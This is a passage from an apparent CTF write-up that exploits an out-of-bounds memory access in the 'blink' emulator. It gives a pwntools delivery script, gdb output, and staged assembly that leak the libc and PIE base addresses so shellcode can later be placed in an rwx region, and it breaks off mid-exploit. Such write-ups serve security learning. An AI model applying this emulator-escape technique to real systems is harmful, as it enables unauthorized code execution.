<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf64 simple.s -o simple.o <span class="o">&amp;&amp;</span> ld -o simple simple.o <span class="o">&amp;&amp;</span> chmod <span class="m">755</span> simple
</span></span></code></pre></td></tr></table>
</div>
</div><p>To make our life easier, I create a simple script to help me easily debug it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">%use masm
</span></span></span><span class="line"><span class="cl"><span class="s1">_start:
</span></span></span><span class="line"><span class="cl"><span class="s1">    nop
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x4141414141414141
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx, 0x4242424242424242
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdx, 0x4343434343434343
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, 0x4444444444444444
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi, 0x4545454545454545
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, 0x4646464646464646
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r8,  0x4848484848484848
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r9,  0x4949494949494949
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r14, 0x4a4a4a4a4a4a4a4a
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r11, 0x4b4b4b4b4b4b4b4b
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, 0x4c4c4c4c4c4c4c4c
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r13, 0x4d4d4d4d4d4d4d4d
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r14, 0x4e4e4e4e4e4e4e4e
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r15, 0x4f4f4f4f4f4f4f4f
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">inf_loop:
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp inf_loop
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create and compile the assembly</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple.s&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">sc</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;nasm -f elf64 simple.s -o simple.o &amp;&amp; ld -o simple simple.o &amp;&amp; chmod 755 simple&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to docker</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;137.184.6.25&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;len: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With this script, we can easily edit the assembly directly in the script, and then running the script will compile our assembly code and send it to the local container.</p>
<p>Let&rsquo;s try to run it and observed it via <code>gdb</code>. To do that, after running the above script, call <code>ps aux</code> to get the <code>PID</code> of the <code>blink</code>&rsquo;s process that currently emulate our input.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; !ps aux
</span></span><span class="line"><span class="cl">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span class="line"><span class="cl">root         1  0.0  0.0   2888  1040 ?        Ss   15:47   0:00 /bin/sh -c /ynetd -p 13337 &#34;timeout 60 python3 -u ./runner.py 2&gt;/dev/null&#34;
</span></span><span class="line"><span class="cl">root         7  0.0  0.0   2644  1008 ?        S    15:47   0:00 /ynetd -p 13337 timeout 60 python3 -u ./runner.py 2&gt;/dev/null
</span></span><span class="line"><span class="cl">root        62  0.0  0.0   5000  3848 pts/0    Ss   15:48   0:00 /bin/bash
</span></span><span class="line"><span class="cl">root        74  0.1  1.0 1042960 80644 pts/0   Sl+  15:48   0:00 gdb blink
</span></span><span class="line"><span class="cl">root        92  0.0  0.0   2888   972 ?        Ss   15:52   0:00 sh -c timeout 60 python3 -u ./runner.py 2&gt;/dev/null
</span></span><span class="line"><span class="cl">root        93  0.0  0.0   2796  1036 ?        S    15:52   0:00 timeout 60 python3 -u ./runner.py
</span></span><span class="line"><span class="cl">root        94  0.0  0.1  15292 10740 ?        S    15:52   0:00 python3 -u ./runner.py
</span></span><span class="line"><span class="cl">root        95  102  0.0 164312  2188 ?        R    15:52   0:22 /app/blink /tmp/tmpviac9u7x
</span></span><span class="line"><span class="cl">root        98  0.0  0.0   2888  1064 pts/0    S+   15:52   0:00 sh -c ps aux
</span></span><span class="line"><span class="cl">root        99  0.0  0.0   7436  1596 pts/0    R+   15:52   0:00 ps aux
</span></span><span class="line"><span class="cl">pwndbg&gt; attach 95
</span></span><span class="line"><span class="cl">Attaching to program: /app/blink, process 95
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that it is attached, let&rsquo;s try to observe it. First, we want to know where does blink store this register. We can simply search for the registers value that we set in the memory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; search -8 0x4141414141414141
</span></span><span class="line"><span class="cl">Searching for value: b&#39;AAAAAAAA&#39;
</span></span><span class="line"><span class="cl">[anon_00400]    0x401003 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[anon_55d3b24c3] 0x55d3b24c3048 mov rsi, rbx /* 0x4141414141414141 */
</span></span><span class="line"><span class="cl">[heap]          0x55d3bbe3b898 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[heap]          0x55d3bbe3be9c 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[heap]          0x55d3bbe3bec3 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[heap]          0x55d3bbe3bed8 &#39;AAAAAAAA&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Checking through the above address one by one by observing the nearby areas value, we can see that the first address that we found in the heap is the location that is used by <code>blink</code> to store the emulated <code>registers</code> value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/50gx 0x55d3bbe3b898-0x28
</span></span><span class="line"><span class="cl">0x55d3bbe3b870:	0x0000000000000000	0x0000000000005671
</span></span><span class="line"><span class="cl">0x55d3bbe3b880:	0x000000000040108d	0x0000120200000202
</span></span><span class="line"><span class="cl">0x55d3bbe3b890:	0x0000000000000000	0x4141414141414141
</span></span><span class="line"><span class="cl">0x55d3bbe3b8a0:	0x4242424242424242	0x4343434343434343
</span></span><span class="line"><span class="cl">0x55d3bbe3b8b0:	0x4444444444444444	0x00007fd6833dfea0
</span></span><span class="line"><span class="cl">0x55d3bbe3b8c0:	0x0000000000000000	0x4545454545454545
</span></span><span class="line"><span class="cl">0x55d3bbe3b8d0:	0x4646464646464646	0x4848484848484848
</span></span><span class="line"><span class="cl">0x55d3bbe3b8e0:	0x4949494949494949	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55d3bbe3b8f0:	0x4b4b4b4b4b4b4b4b	0x4c4c4c4c4c4c4c4c
</span></span><span class="line"><span class="cl">0x55d3bbe3b900:	0x4d4d4d4d4d4d4d4d	0x4e4e4e4e4e4e4e4e
</span></span><span class="line"><span class="cl">0x55d3bbe3b910:	0x4f4f4f4f4f4f4f4f	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, observe that among the registers, there is an interesting address with value <code>0x00007fd6833dfea0</code>. Checking through the below memory mappings of <code>blink</code>, we can observe that the interesting value is actually adjacent to the <code>libc</code> base address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; vmmap
</span></span><span class="line"><span class="cl">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">    0x7fd682be0000     0x7fd684c22000 rw-p  2042000      0 [anon_7fd682be0]
</span></span><span class="line"><span class="cl">    0x7fd684c22000     0x7fd684c2d000 rw-p     b000      0 /dev/zero (deleted)
</span></span><span class="line"><span class="cl">    0x7fd684c2d000     0x7fd684c34000 r--p     7000      0 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
</span></span><span class="line"><span class="cl">    0x7fd684c34000     0x7fd684c8b000 r--p    57000      0 /usr/lib/locale/C.utf8/LC_CTYPE
</span></span><span class="line"><span class="cl">    0x7fd684c8b000     0x7fd684c8e000 rw-p     3000      0 [anon_7fd684c8b]
</span></span><span class="line"><span class="cl">    0x7fd684c8e000     0x7fd684cb6000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, the question is what is that value being used for? My hypothesis during seeing that value is that it is the emulated <code>rsp</code> address. Let&rsquo;s try to modify our assembly code by setting the <code>r9</code> to <code>rsp</code> to confirm our hypothesis, then re-check the emulated registers value in <code>gdb</code> (simply repeat the above step).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/50gx 0x5608d6421898-0x28
</span></span><span class="line"><span class="cl">0x5608d6421870:	0x0000000000000000	0x0000000000005671
</span></span><span class="line"><span class="cl">0x5608d6421880:	0x0000000000401086	0x0000120200000202
</span></span><span class="line"><span class="cl">0x5608d6421890:	0x0000000000000000	0x4141414141414141
</span></span><span class="line"><span class="cl">0x5608d64218a0:	0x4242424242424242	0x4343434343434343
</span></span><span class="line"><span class="cl">0x5608d64218b0:	0x4444444444444444	0x00007f2f4e794ea0
</span></span><span class="line"><span class="cl">0x5608d64218c0:	0x0000000000000000	0x4545454545454545
</span></span><span class="line"><span class="cl">0x5608d64218d0:	0x4646464646464646	0x4848484848484848
</span></span><span class="line"><span class="cl">0x5608d64218e0:	0x00007f2f4e794ea0	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5608d64218f0:	0x4b4b4b4b4b4b4b4b	0x4c4c4c4c4c4c4c4c
</span></span><span class="line"><span class="cl">0x5608d6421900:	0x4d4d4d4d4d4d4d4d	0x4e4e4e4e4e4e4e4e
</span></span><span class="line"><span class="cl">0x5608d6421910:	0x4f4f4f4f4f4f4f4f	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is indeed the <code>rsp</code> of the emulated binary! This means that we can easily get the <code>libc</code> base address because one of our emulated program register value is adjacent to it.</p>
<p>Now, we need to check, whether we can actually increase this <code>rsp</code> value so that it points to <code>libc</code> area or not, so that we can load and store the <code>libc</code> area value to our emulated register. If we can do this, this means that the vulnerability in the <code>blink</code> binary is that we have Out-of-Bound Access outside the emulated allocated area. Let&rsquo;s try to prove our hypothesis by crafting a new assembly to check it.</p>
<p>Before crafting the assembly, at first, I thought that the offset between the emulated <code>rsp</code> value and the <code>libc</code> base address will be the same between my local container and the remote container. However, during testing it, I observe that the offset was different. This means that I couldn&rsquo;t simply increase the <code>rsp</code> with static offset to make it points to libc.</p>
<p>So, in order to change our emulated <code>rsp</code> value to point to <code>libc</code> area, my strategy is to increased the <code>rsp</code> value by <code>8</code>, and then check whether the contents has the default 8 bytes signature header of <code>libc</code> file or not (<code>0x03010102464c457f</code>). If there isn&rsquo;t any crash and the contents are the same, that means:</p>
<ul>
<li>Our <code>rsp</code> has points to the <code>libc</code> area.</li>
<li>We have OOB access because we can load the <code>rsp</code> content even though it&rsquo;s already pointing to the area outside of the emulated area (which in this case the <code>libc</code> area).</li>
</ul>
<p>Below is the new assembly that I craft to check it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl">%<span class="n">use</span> <span class="n">masm</span>
</span></span><span class="line"><span class="cl"><span class="n">_start</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">nop</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="p">;</span> <span class="n">just</span> <span class="kr">for</span> <span class="n">debugging</span> <span class="n">purpose</span><span class="p">,</span> <span class="n">to</span> <span class="n">easily</span> <span class="n">find</span> <span class="n">the</span> <span class="n">emulated</span> <span class="n">registers</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">stage_1</span><span class="o">:</span> <span class="p">;</span> <span class="n">find</span> <span class="n">libc</span> <span class="n">base</span> <span class="n">address</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r13</span><span class="p">,</span> <span class="mh">0x03010102464c457f</span><span class="p">;</span> <span class="n">set</span> <span class="n">r13</span> <span class="n">to</span> <span class="n">libc</span> <span class="n">first</span> <span class="m">8</span> <span class="n">bytes</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r12</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">[rsp]</span><span class="p">;</span> <span class="n">set</span> <span class="n">r12</span> <span class="n">to</span> <span class="n">rsp</span> <span class="n">content</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmp</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r13</span> <span class="p">;</span> <span class="n">compare</span> <span class="n">it</span>
</span></span><span class="line"><span class="cl">    <span class="n">je</span> <span class="n">stage_2</span> <span class="p">;</span> <span class="kr">if</span> <span class="n">it</span> <span class="n">is</span> <span class="n">equals</span><span class="p">,</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">stage_2</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span> <span class="n">rsp</span><span class="p">,</span> <span class="m">8</span> <span class="p">;</span> <span class="kr">else</span><span class="p">,</span> <span class="n">increase</span> <span class="n">the</span> <span class="n">rsp</span> <span class="n">by</span> <span class="m">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">stage_1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">stage_2</span><span class="o">:</span> <span class="p">;</span> <span class="kr">for</span> <span class="n">now</span><span class="p">,</span> <span class="n">set</span> <span class="n">stage_2</span> <span class="n">to</span> <span class="n">infinite</span> <span class="n">loop</span> <span class="n">first</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">stage_2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above code will try to increase the <code>rsp</code> until its content equals to the libc first 8 bytes, because if it is equals, that means we have successfully points the emulated <code>rsp</code> to <code>libc</code> area. If the above program keep running, that means our above code works properly.</p>
<p>Trying to run the above code, the program kept running, which means that my hypothesis is correct, which means we indeed have OOB access to the outside of the emulated binary area. If you really want to double check it, you can simply attach the process again in the <code>gdb</code>, and check the emulated <code>rsp</code> value like what we did before, to ensure that the <code>rsp</code> value has changed to <code>libc</code> base.</p>
<p>One more thing to observed is that checking through the <code>blink</code> memory mappings, we can see that there are <code>rwx</code> region adjacent to the <code>blink</code> PIE base address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; vmmap
</span></span><span class="line"><span class="cl">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span></span><span class="line"><span class="cl">             Start                End Perm     Size Offset File
</span></span><span class="line"><span class="cl">          0x400000           0x402000 rw-p     2000      0 [anon_00400]
</span></span><span class="line"><span class="cl">    0x5608cdaa0000     0x5608cdacd000 r-xp    2d000      0 /app/blink
</span></span><span class="line"><span class="cl">    0x5608cdad0000     0x5608cdad2000 rw-p     2000  30000 /app/blink
</span></span><span class="line"><span class="cl">    0x5608cdad2000     0x5608cdad3000 rw-p     1000      0 [anon_5608cdad2]
</span></span><span class="line"><span class="cl">    0x5608cdad3000     0x5608cdb13000 rwxp    40000      0 [anon_5608cdad3]
</span></span></code></pre></td></tr></table>
</div>
</div><p>To summarize, from our first blackbox analysis by observing the behavior through the gdb, we have two important informations:</p>
<ul>
<li>We have OOB access abusing the emulated <code>rsp</code> value that is adjacent to <code>libc</code>.</li>
<li>We have <code>rwx</code> region.</li>
</ul>
<p>Now, lets try to think how to use this information to craft our solution.</p>
<h3 id="solution-1">Solution</h3>
<h4 id="stage-1--stage-2-find-libc-address--pie-base">Stage 1 &amp; Stage 2: Find LIBC address &amp; PIE Base</h4>
<p>Now that we have OOB access to the <code>libc</code> area, I want to try to leak the PIE base address, because by leaking the PIE base addres, we can calculate the <code>rwx</code> region that we saw before, and then try to put shellcode to it. Observing through the <code>gdb</code> again, I noticed that <code>libc_base-0x001d10</code> contains the PIE base address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; search -8 0x5608cdaa0000
</span></span><span class="line"><span class="cl">Searching for value: b&#39;\x00\x00\xaa\xcd\x08V\x00\x00&#39;
</span></span><span class="line"><span class="cl">[anon_7f2f50040] 0x7f2f500412f0 0x5608cdaa0000
</span></span><span class="line"><span class="cl">ld-linux-x86-64.so.2 0x7f2f503932e0 0x5608cdaa0000
</span></span><span class="line"><span class="cl">ld-linux-x86-64.so.2 0x7f2f50393638 0x5608cdaa0000
</span></span><span class="line"><span class="cl">pwndbg&gt; hex(-0x7f2f500412f0+0x7f2f50043000)
</span></span><span class="line"><span class="cl">+0000 0x001d10 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s start crafting the <code>stage_2</code> of our payload, which is to get the PIE base address</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl">%<span class="n">use</span> <span class="n">masm</span>
</span></span><span class="line"><span class="cl"><span class="n">_start</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">nop</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="p">;</span> <span class="n">just</span> <span class="kr">for</span> <span class="n">debugging</span> <span class="n">purpose</span><span class="p">,</span> <span class="n">to</span> <span class="n">easily</span> <span class="n">find</span> <span class="n">the</span> <span class="n">emulated</span> <span class="n">registers</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">stage_1</span><span class="o">:</span> <span class="p">;</span> <span class="n">find</span> <span class="n">libc</span> <span class="n">base</span> <span class="n">address</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r13</span><span class="p">,</span> <span class="mh">0x03010102464c457f</span><span class="p">;</span> <span class="n">set</span> <span class="n">r13</span> <span class="n">to</span> <span class="n">libc</span> <span class="n">first</span> <span class="m">8</span> <span class="n">bytes</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r12</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">[rsp]</span><span class="p">;</span> <span class="n">set</span> <span class="n">r12</span> <span class="n">to</span> <span class="n">rsp</span> <span class="n">content</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmp</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r13</span> <span class="p">;</span> <span class="n">compare</span> <span class="n">it</span>
</span></span><span class="line"><span class="cl">    <span class="n">je</span> <span class="n">stage_2</span> <span class="p">;</span> <span class="kr">if</span> <span class="n">it</span> <span class="n">is</span> <span class="n">equals</span><span class="p">,</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">stage_2</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span> <span class="n">rsp</span><span class="p">,</span> <span class="m">8</span> <span class="p">;</span> <span class="kr">else</span><span class="p">,</span> <span class="n">increase</span> <span class="n">the</span> <span class="n">rsp</span> <span class="n">by</span> <span class="m">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">stage_1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">stage_2</span><span class="o">:</span> <span class="p">;</span> <span class="n">find</span> <span class="n">pie</span> <span class="n">base</span> <span class="n">address</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">rsp</span> <span class="p">;</span> <span class="n">copy</span> <span class="n">libc</span> <span class="n">base</span> <span class="n">to</span> <span class="n">r9</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x001d10</span> <span class="p">;</span> <span class="n">now</span> <span class="n">r9</span> <span class="n">contains</span> <span class="n">pie_base</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">[r9]</span> <span class="p">;</span> <span class="n">set</span> <span class="n">r9</span> <span class="n">to</span> <span class="n">r9</span> <span class="n">content</span><span class="p">,</span> <span class="n">which</span> <span class="n">is</span> <span class="n">pie_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">stage_3</span><span class="o">:</span> <span class="p">;</span> <span class="kr">for</span> <span class="n">now</span><span class="p">,</span> <span class="n">set</span> <span class="n">stage_3</span> <span class="n">to</span> <span class="n">infinite</span> <span class="n">loop</span> <span class="n">first</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">stage_3</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Compile and run it again, and if you check in the <code>gdb</code>, our <code>r9</code> now points to the PIE base of <code>blink</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
